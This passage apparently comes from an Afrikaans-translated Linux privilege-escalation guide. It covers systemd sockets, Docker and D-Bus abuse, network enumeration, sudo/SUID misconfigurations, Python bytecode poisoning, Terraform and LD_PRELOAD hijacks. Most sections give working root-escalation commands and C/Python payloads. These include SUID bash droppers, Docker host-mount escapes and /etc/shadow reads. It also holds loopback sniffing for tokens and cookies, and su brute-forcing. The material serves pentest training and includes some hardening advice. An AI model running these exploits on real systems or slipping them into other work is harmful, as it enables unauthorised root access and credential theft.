- `Accept`: Neem ’n boolean argument. As **true**, word ’n **service instance gespawn vir elke inkomende connection** en net die connection socket word daaraan deurgegee. As **false**, word al die luisterende sockets self **deurgegee aan die gestartete service unit**, en slegs een service unit word gespawn vir al die connections. Hierdie waarde word geïgnoreer vir datagram sockets en FIFOs waar ’n enkele service unit onvoorwaardelik alle inkomende traffic hanteer. **Standaard is false**. Vir performance-redes word dit aanbeveel om nuwe daemons slegs te skryf op ’n manier wat geskik is vir `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Neem een of meer command lines, wat **uitgevoer word voor** of **na** die luisterende **sockets**/FIFOs **geskep** en gebind is, onderskeidelik. Die eerste token van die command line moet ’n absolute filename wees, gevolg deur arguments vir die process.
- `ExecStopPre`, `ExecStopPost`: Addisionele **commands** wat **uitgevoer word voor** of **na** die luisterende **sockets**/FIFOs **gesluit** en verwyder is, onderskeidelik.
- `Service`: Spesifiseer die **service** unit naam om te **aktiveer** op **inkomende traffic**. Hierdie setting word slegs toegelaat vir sockets met Accept=no. Dit is standaard die service wat dieselfde naam as die socket dra (met die suffix vervang). In die meeste gevalle behoort dit nie nodig te wees om hierdie option te gebruik nie.

### Writable .socket files

As jy ’n **writable** `.socket` file vind, kan jy by die begin van die `[Socket]` section iets soos dit **voeg**: `ExecStartPre=/home/kali/sys/backdoor` en die backdoor sal uitgevoer word voordat die socket geskep word. Daarom sal jy **waarskynlik moet wag totdat die machine herbegin is.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Socket activation + writable unit path (create missing service)

Another high-impact misconfiguration is:

- a socket unit with `Accept=no` and `Service=<name>.service`
- the referenced service unit is missing
- an attacker can write into `/etc/systemd/system` (or another unit search path)

In that case, the attacker can create `<name>.service`, then trigger traffic to the socket so systemd loads and executes the new service as root.

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Skryfbare sockets

As jy **enige skryfbare socket identifiseer** (_nou praat ons van Unix Sockets en nie van die config `.socket`-lêers nie_), dan **kan jy kommunikeer** met daardie socket en moontlik ’n vulnerability uitbuit.

### Tel Unix Sockets op
```bash
netstat -a -p --unix
```
### Rou verbinding
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Uitbuitingsvoorbeeld:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP-sockets

Let daarop dat daar dalk sommige **sockets is wat vir HTTP**-versoeke luister (_ek praat nie van .socket-lêers nie maar van die lêers wat as unix sockets optree_). Jy kan dit nagaan met:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
As die socket met ’n HTTP-versoek **reageer**, dan kan jy daarmee **kommunikeer** en moontlik **’n sekuriteitsfout uitbuit**.

### Writable Docker Socket

Die Docker socket, wat dikwels by `/var/run/docker.sock` gevind word, is ’n kritieke lêer wat beveilig moet word. By verstek is dit skryfbaar deur die `root`-gebruiker en lede van die `docker`-groep. Om skryftoegang tot hierdie socket te hê, kan lei tot privilege escalation. Hier is ’n uiteensetting van hoe dit gedoen kan word en alternatiewe metodes as die Docker CLI nie beskikbaar is nie.

#### **Privilege Escalation met Docker CLI**

As jy skryftoegang tot die Docker socket het, kan jy privileges eskaleer met die volgende opdragte:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Hierdie commands laat jou toe om 'n container te laat loop met root-vlak toegang tot die host se file system.

#### **Using Docker API Directly**

In gevalle waar die Docker CLI nie beskikbaar is nie, kan die Docker socket steeds gemanipuleer word met die Docker API en `curl` commands.

1.  **List Docker Images:** Haal die lys van beskikbare images op.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Stuur 'n request om 'n container te skep wat die host system se root directory mount.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start die nuutgeskepte container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Gebruik `socat` om 'n connection na die container te vestig, wat command execution binne dit moontlik maak.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nadat jy die `socat` connection opgestel het, kan jy commands direk in die container uitvoer met root-vlak toegang tot die host se file system.

### Others

Let daarop dat as jy write permissions oor die docker socket het omdat jy **binne die groep `docker`** is, jy [**meer ways het om privileges te escalate**](interesting-groups-linux-pe/index.html#docker-group). As die [**docker API in 'n port luister** kan jy dit ook moontlik kompromitteer](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Kyk **na meer ways om uit containers te breek of container runtimes te abuse om privileges te escalate** in:


{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

As jy vind dat jy die **`ctr`** command kan gebruik, lees die volgende page, aangesien jy dit **kan abuse om privileges te escalate**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

As jy vind dat jy die **`runc`** command kan gebruik, lees die volgende page, aangesien jy dit **kan abuse om privileges to escalate**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus is 'n gesofistikeerde **inter-Process Communication (IPC) system** wat applications in staat stel om doeltreffend te interakteer en data te deel. Ontwerp met die moderne Linux system in gedagte, bied dit 'n robuuste framework vir verskillende vorms van application communication.

Die system is veelsydig en ondersteun basiese IPC wat data-uitruiling tussen processes verbeter, soortgelyk aan **enhanced UNIX domain sockets**. Verder help dit met die uitsaai van events of signals, wat naatlose integrasie tussen system components bevorder. Byvoorbeeld, 'n signal van 'n Bluetooth daemon oor 'n inkomende call kan 'n music player aanspoor om te mute, wat user experience verbeter. Daarbenewens ondersteun D-Bus 'n remote object system, wat service requests en method invocations tussen applications vereenvoudig en processes stroomlyn wat tradisioneel kompleks was.

D-Bus werk op 'n **allow/deny model**, en bestuur message permissions (method calls, signal emissions, ens.) op grond van die kumulatiewe effek van ooreenstemmende policy rules. Hierdie policies spesifiseer interactions met die bus, wat moontlik privilege escalation kan toelaat deur die exploitation van hierdie permissions.

'n Voorbeeld van so 'n policy in `/etc/dbus-1/system.d/wpa_supplicant.conf` word voorsien, wat permissions uiteensit vir die root user om boodskappe van `fi.w1.wpa_supplicant1` te besit, te stuur na, en te ontvang van.

Policies sonder 'n gespesifiseerde user of group is universeel van toepassing, terwyl "default" context policies op almal van toepassing is wat nie deur ander spesifieke policies gedek word nie.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Leer hoe om D-Bus-kommunikasie hier te enumereer en uit te buit:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

Dis altyd interessant om die netwerk te enumereer en die posisie van die masjien uit te vind.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Uitgaande filter vinnige triage

As die gasheer opdragte kan uitvoer maar callbacks misluk, skei DNS-, transport-, proxy- en roete-filtering vinnig:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Oop poorte

Kontroleer altyd netwerkdienste wat op die masjien loop waarmee jy nie voorheen kon interaksie hê nie voordat jy toegang daartoe verkry:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Klassifiseer listeners volgens bind-doelwit:

- `0.0.0.0` / `[::]`: blootgestel op alle plaaslike interfaces.
- `127.0.0.1` / `::1`: slegs plaaslik (goeie tunnel/forward-kandidate).
- Spesifieke interne IPs (bv. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): gewoonlik slegs vanaf interne segmente bereikbaar.

### Local-only service triage workflow

Wanneer jy ’n host compromise, word services wat aan `127.0.0.1` gebind is, dikwels vir die eerste keer vanaf jou shell bereikbaar. ’n Vinnige local workflow is:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS as `n` netwerk-skandeerder (network-only mode)

Benewens local PE-checks, kan linPEAS as ’n gefokusde network scanner hardloop. Dit gebruik beskikbare binaries in `$PATH` (tipies `fping`, `ping`, `nc`, `ncat`) en installeer geen tooling nie.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
As jy `-d`, `-p`, of `-i` sonder `-t` gebruik, tree linPEAS op as ’n suiwer netwerk skandeerder (dit slaan die res van die privilege-escalation-kontroles oor).

### Sniffing

Kontroleer of jy verkeer kan sniff. As jy kan, kan jy dalk কিছু credentials gryp.
```
timeout 1 tcpdump
```
Vinnige praktiese kontroles:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) is veral waardevol in post-exploitation omdat baie interne-alleen dienste tokens/cookies/credentials daar blootstel:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Capture nou, parse later:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Gebruikers

### Generiese Enumerasie

Kontroleer **wie** jy is, watter **privileges** het jy, watter **users** is in die systems, watter een kan **login** en watter een het **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Sommige Linux-weergawes is deur ’n fout geraak wat gebruikers met **UID > INT_MAX** toelaat om voorregte te eskaleer. Meer inligting: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Groups

Kontroleer of jy ’n **lid van ’n groep** is wat vir jou root-regte kan gee:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Kontroleer of enigiets interessant in die knipbord geleë is (indien moontlik)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Wagwoordbeleid
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekende wagwoorde

As jy enige wagwoord van die omgewing **ken**, probeer om met elke gebruiker aan te meld met daardie wagwoord.

### Su Brute

As jy nie omgee om baie geraas te maak nie en `su` en `timeout` binaries op die rekenaar teenwoordig is, kan jy probeer om gebruikers te brute-force met [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) met die `-a` parameter probeer ook gebruikers brute-force.

## Writable PATH abuses

### $PATH

As jy vind dat jy **binne een of ander folder van die $PATH kan skryf**, kan jy dalk privileges eskaleer deur **'n backdoor binne die skryfbare folder te skep** met die naam van een of ander command wat deur 'n ander gebruiker (root ideaal) uitgevoer gaan word en wat **nie gelaai word vanaf 'n folder wat voor** jou skryfbare folder in $PATH lê nie.

### SUDO and SUID

Jy kan toegelaat word om 'n sekere command met sudo uit te voer, of dit kan die suid bit hê. Gaan dit na met:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Sommige **onverwagte opdragte laat jou toe om lêers te lees en/of te skryf of selfs ’n opdrag uit te voer.** Byvoorbeeld:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo-konfigurasie kan ’n gebruiker toelaat om sekere opdragte uit te voer met ’n ander gebruiker se voorregte sonder om die wagwoord te ken.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In hierdie voorbeeld kan die gebruiker `demo` `vim` as `root` laat loop; dit is nou triviaal om ’n shell te kry deur ’n ssh-sleutel in die root-gids by te voeg of deur `sh` aan te roep.
```
sudo vim -c '!sh'
```
### SETENV

Hierdie opdrag laat die gebruiker toe om **’n omgewingsveranderlike te stel** terwyl iets uitgevoer word:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Hierdie voorbeeld, **gebaseer op HTB machine Admirer**, was **kwesbaar** vir **PYTHONPATH hijacking** om ’n arbitrêre Python-biblioteek te laai terwyl die script as root uitgevoer is:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Writable `__pycache__` / `.pyc` poisoning in sudo-allowed Python imports

As `n **sudo-allowed Python script** `n module importe waarvan die pakketgids `n **writable `__pycache__`** `n, kan jy moontlik die gestoorde `.pyc` vervang en kode-uitvoering as die bevoorregte gebruiker kry by die volgende import.

- Why it works:
- CPython stoor bytecode-caches in `__pycache__/module.cpython-<ver>.pyc`.
- Die interpreter valideer die **header** (magic + timestamp/hash metadata gekoppel aan die source), en voer dan die marshaled code object uit wat ná daardie header gestoor is.
- As jy die gestoorde lêer kan **delete and recreate** omdat die gids writable is, kan 'n root-owned maar nie-writable `.pyc` steeds vervang word.
- Typical path:
- `sudo -l` wys 'n Python script of wrapper wat jy as root kan run.
- Daardie script importe 'n local module van `/opt/app/`, `/usr/local/lib/...`, ens.
- Die imported module se `__pycache__` directory is writable deur jou user of deur almal.

Quick enumeration:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
As jy die geprivilegieerde script kan inspekteer, identifiseer die ingevoerde modules en hul cache-pad:
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Misbruik-werkvloei:

1. Run die sudo-allowed script een keer sodat Python die legit cache file skep as dit nog nie reeds bestaan nie.
2. Lees die eerste 16 bytes van die legit `.pyc` en hergebruik dit in die poisoned file.
3. Compileer ’n payload code object, `marshal.dumps(...)` dit, delete die oorspronklike cache file, en recreate dit met die oorspronklike header plus jou malicious bytecode.
4. Re-run die sudo-allowed script sodat die import jou payload as root uitvoer.

Belangrike notas:

- Die hergebruik van die oorspronklike header is key omdat Python die cache metadata teen die source file check, nie of die bytecode body regtig by die source ooreenstem nie.
- Dit is veral useful wanneer die source file root-owned en nie writable is nie, maar die containing `__pycache__` directory wel is.
- Die attack fail as die privileged process `PYTHONDONTWRITEBYTECODE=1` gebruik, import from ’n location met safe permissions, of write access na elke directory in die import path verwyder.

Minimal proof-of-concept shape:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- Verseker dat geen gids in die bevoorregte Python-importpad deur lae-bevoorregte gebruikers skryfbaar is nie, insluitend `__pycache__`.
- Vir bevoorregte uitvoerings, oorweeg `PYTHONDONTWRITEBYTECODE=1` en periodieke kontroles vir onverwags skryfbare `__pycache__`-gidse.
- Behandel skryfbare plaaslike Python-modules en skryfbare kasgidse op dieselfde manier as wat jy skryfbare shell-skripte of gedeelde biblioteke wat deur root uitgevoer word, sou behandel.

### BASH_ENV preserved via sudo env_keep → root shell

As sudoers `BASH_ENV` behou (bv. `Defaults env_keep+="ENV BASH_ENV"`), kan jy Bash se nie-interaktiewe opstartgedrag gebruik om arbitrêre code as root uit te voer wanneer jy ’n toegelate command aanroep.

- Why it works: Vir nie-interaktiewe shells evalueer Bash `$BASH_ENV` en source daardie file voordat die teikenskrip uitgevoer word. Baie sudo rules laat toe dat ’n script of ’n shell wrapper uitgevoer word. As `BASH_ENV` deur sudo behou word, word jou file met root privileges gesource.

- Requirements:
- ’n sudo rule wat jy kan run (enige target wat `/bin/bash` nie-interaktief aanroep, of enige bash script).
- `BASH_ENV` teenwoordig in `env_keep` (check met `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Verharding:
- Verwyder `BASH_ENV` (en `ENV`) uit `env_keep`, verkies `env_reset`.
- Vermy shell wrappers vir sudo-allowed commands; gebruik minimale binaries.
- Oorweeg sudo I/O logging en waarskuwings wanneer preserved env vars gebruik word.

### Terraform via sudo met preserved HOME (!env_reset)

As sudo die omgewing ongeskonde laat (`!env_reset`) terwyl `terraform apply` toegelaat word, bly `$HOME` as die roepende gebruiker. Terraform laai dus **$HOME/.terraformrc** as root en eerbiedig `provider_installation.dev_overrides`.

- Wys die vereiste provider na ’n writable directory en laat val ’n kwaadwillige plugin met die naam van die provider (bv. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform sal die Go plugin handshake laat misluk, maar voer die payload as root uit voordat dit sterf, en laat ’n SUID shell agter.

### TF_VAR overrides + symlink validation bypass

Terraform-veranderlikes kan via `TF_VAR_<name>` environment variables verskaf word, wat oorleef wanneer sudo die environment behou. Swak validations soos `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` kan met symlinks omseil word:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform los die simboliese skakel op en kopieer die werklike `/root/root.txt` na ’n bestemming wat deur die aanvaller gelees kan word. Dieselfde benadering kan gebruik word om in bevoorregte paaie te **skryf** deur vooraf bestemming-simboliese skakels te skep (bv. deur die provider se bestemmingspad binne `/etc/cron.d/` te wys).

### requiretty / !requiretty

Op sommige ouer verspreidings kan sudo met `requiretty` gekonfigureer wees, wat sudo dwing om slegs vanaf ’n interaktiewe TTY te loop. As `!requiretty` ingestel is (of die opsie afwesig is), kan sudo vanaf nie-interaktiewe kontekste soos reverse shells, cron jobs, of scripts uitgevoer word.
```bash
Defaults !requiretty
```
Dit is nie op sigself ’n direkte kwesbaarheid nie, maar dit brei die situasies uit waar sudo-reëls misbruik kan word sonder om ’n volle PTY nodig te hê.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

As `sudo -l` wys `env_keep+=PATH` of ’n `secure_path` wat aanvaller-skryfbare inskrywings bevat (bv. `/home/<user>/bin`), kan enige relatiewe command binne die sudo-toegelate target oorskadu word.

- Requirements: ’n sudo-reël (dikwels `NOPASSWD`) wat ’n script/binary laat loop wat commands sonder absolute paths aanroep (`free`, `df`, `ps`, ens.) en ’n skryfbare PATH-inskrywing wat eerste gesoek word.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo uitvoering om paaie te omseil
**Spring** om ander lêers te lees of gebruik **symlinks**. Byvoorbeeld in sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
As ’n **wildcard** gebruik word (\*), is dit selfs makliker:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Teenmaatreëls**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

As die **sudo permission** gegee word aan ’n enkele command **sonder om die path te spesifiseer**: _hacker10 ALL= (root) less_ kan jy dit uitbuit deur die PATH veranderlike te wysig
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Hierdie tegniek kan ook gebruik word as 'n **suid** binary **’n ander command uitvoer sonder om die path daarna te spesifiseer nie (kontroleer altyd met** _**strings**_ **die inhoud van 'n vreemde SUID binary)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary met command path

As die **suid** binary **’n ander command uitvoer terwyl die path gespesifiseer word**, dan kan jy probeer om **’n function te export** wat dieselfde naam het as die command wat die suid file aanroep.

Byvoorbeeld, as ’n suid binary _**/usr/sbin/service apache2 start**_ aanroep, moet jy probeer om die function te skep en dit te export:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Dan, wanneer jy die suid binary aanroep, sal hierdie function uitgevoer word

### Writable script uitgevoer deur 'n SUID wrapper

'n Algemene custom-app misconfiguration is 'n root-owned SUID binary wrapper wat 'n script execute, terwyl die script self writable is vir low-priv users.

Tipiese pattern:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
As `/usr/local/bin/backup.sh` skryfbaar is, kan jy payload-opdragte byvoeg en dan die SUID-wrapper uitvoer:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Vinnige kontroles:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Hierdie aanvalspad is veral algemeen in "maintenance"/"backup" wrappers wat in `/usr/local/bin` verskeep word.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die **LD_PRELOAD** omgewingsveranderlike word gebruik om een of meer shared libraries (.so files) te spesifiseer wat deur die loader gelaai moet word voor alle ander, insluitend die standaard C library (`libc.so`). Hierdie proses staan bekend as preloading van 'n library.

Om stelselveiligheid te handhaaf en te keer dat hierdie funksie misbruik word, veral met **suid/sgid** executables, dwing die stelsel sekere voorwaardes af:

- Die loader ignoreer **LD_PRELOAD** vir executables waar die regte user ID (_ruid_) nie ooreenstem met die effektiewe user ID (_euid_ nie).
- Vir executables met suid/sgid, word slegs libraries in standaard paths wat ook suid/sgid is, gepreload.

Privilege escalation kan plaasvind as jy die vermoë het om commands met `sudo` uit te voer en die output van `sudo -l` die stelling **env_keep+=LD_PRELOAD** insluit. Hierdie konfigurasie laat toe dat die **LD_PRELOAD** omgewingsveranderlike behoue bly en herken word selfs wanneer commands met `sudo` uitgevoer word, wat moontlik kan lei tot die uitvoer van arbitrary code met verhoogde privileges.
```
Defaults        env_keep += LD_PRELOAD
```
Save as **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Dan **kompileer dit** met:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Laastens, **eskaleer privileges** deur te hardloop
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> ’n Soortgelyke privesc kan misbruik word as die attacker die **LD_LIBRARY_PATH** omgewingsveranderlike beheer, omdat hy die pad beheer waar libraries gesoek gaan word.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Wanneer 'n binary met **SUID**-toestemmings voorkom wat ongewoon lyk, is dit goeie praktyk om te verifieer of dit **.so**-lêers behoorlik laai. Dit kan nagegaan word deur die volgende command uit te voer:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Byvoorbeeld, om ’n fout soos _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ teë te kom, dui op ’n moontlike ontginning.

Om dit te ontgin, sou ’n mens voortgaan deur ’n C-lêer te skep, sê _"/path/to/.config/libcalc.c"_, wat die volgende kode bevat:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Hierdie kode, sodra dit saamgestel en uitgevoer is, poog om voorregte te verhoog deur lêertoestemmings te manipuleer en ’n shell met verhoogde voorregte uit te voer.

